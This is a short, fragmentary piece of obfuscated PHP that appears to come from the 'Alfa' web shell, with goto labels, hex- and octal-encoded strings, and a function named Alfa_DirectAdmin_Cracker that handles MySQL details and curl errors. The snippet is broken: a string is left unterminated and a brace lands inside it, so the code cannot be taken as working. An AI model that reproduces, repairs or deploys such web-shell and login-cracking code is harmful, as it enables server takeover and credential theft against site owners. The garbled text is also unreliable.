    if ($GLOBALS["sys"] != "unix") {
        $pwd = "cd";
...
goto SUDj6;
LeTOU: function Alfa_DirectAdmin_Cracker($info) {
    if (!$info["mysql"]) {
    ...
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        echo "\74\x66\157\x6e\164\x20\143\157\x6c\x6f\162\75\x27\x72\x65\x64\47\76\x45\162\x72\157\x72\72\40{$curl_error
    }
    \74\x2f\146\x6f\156\164\x3e\74\x62\162\76";
}
